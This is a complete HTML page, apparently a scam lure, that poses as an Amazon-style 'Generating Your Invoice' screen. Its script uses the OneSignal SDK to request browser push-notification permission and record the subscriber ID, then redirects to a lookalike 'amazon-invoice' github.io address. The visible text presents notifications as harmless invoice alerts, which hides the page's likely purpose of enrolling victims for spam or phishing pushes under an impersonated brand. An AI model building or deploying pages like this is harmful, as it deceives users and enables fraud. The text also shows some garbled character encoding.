<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<title>Generating Your Invoice</title>

<!-- OneSignal SDK -->
<script src="https://cdn.onesignal.com/sdks/web/v16/OneSignalSDK.page.js" defer></script>

<script>
window.OneSignalDeferred = window.OneSignalDeferred || [];
OneSignalDeferred.push(async function(OneSignal) {
    await OneSignal.init({
        appId: "59378825-1e42-4024-a9f1-87553ae750f8",
        allowLocalhostAsSecureOrigin: true
    });

    try {
        // Check if notifications are already enabled
        const isEnabled = await OneSignal.isPushNotificationsEnabled();
        console.log("Push notifications enabled:", isEnabled);

        if (!isEnabled) {
            // Ask the user to allow notifications
            await OneSignal.registerForPushNotifications();
            console.log("Subscription prompt shown");
        }

        // Wait for player ID after subscription
        const playerId = await OneSignal.getUserIdAsync();
        console.log("Player ID found:", playerId);

        // Optional: send to backend if needed
        // await fetch("https://onesignal-backend-fh6j.onrender.com/first-push", { ... });

    } catch (err) {
        console.error("Error handling OneSignal subscription:", err);
    }

    // Redirect to invoice page after subscription handled
    window.location.href = "https://amazon-invoice.github.io/Invoice-9812832/";
});
</script>

<style>
body {
  font-family: Arial, Helvetica, sans-serif;
  background-color: #f2f2f2;
  margin: 0;
  height: 100vh;
  display: flex;
  align-items: center;
  justify-content: center;
}

.modal-overlay {
  position: fixed;
  inset: 0;
  background: rgba(0, 0, 0, 0.5);
  display: flex;
  align-items: center;
  justify-content: center;
  padding: 10px;
}

.modal {
  background: #ffffff;
  width: 600px;
  max-width: 90%;
  padding: 40px 35px;
  border-radius: 8px;
  text-align: center;
  box-shadow: 0 6px 30px rgba(0, 0, 0, 0.25);
}

.modal h2 {
  margin: 0 0 15px;
  font-size: 24px;
  color: #111;
}

.modal p {
  font-size: 16px;
  color: #555;
  line-height: 1.7;
  margin-bottom: 18px;
}

.loader {
  width: 55px;
  height: 55px;
  border: 5px solid #e0e0e0;
  border-top: 5px solid #ff9900;
  border-radius: 50%;
  animation: spin 1s linear infinite;
  margin: 0 auto 15px;
}

@keyframes spin {
  to { transform: rotate(360deg); }
}

.note {
  margin-top: 18px;
  font-size: 14px;
  color: #777;
}
</style>
</head>

<body>
<div class="modal-overlay">
  <div class="modal">
    <h2>Generating Your Invoice</h2>
    <p>ðŸ”” Turn on notifications to be alerted the moment your invoice is ready.</p>
    <p>We are preparing your invoice. This process usually takes less than a minute.</p>
    <p>Browser notifications are optional and are used only to notify you when your invoice is ready.</p>
    <div class="loader"></div>
    <div class="note">You can keep browsing or stay on this page â€” weâ€™ll take care of the rest.</div>
  </div>
</div>
</body>
</html>
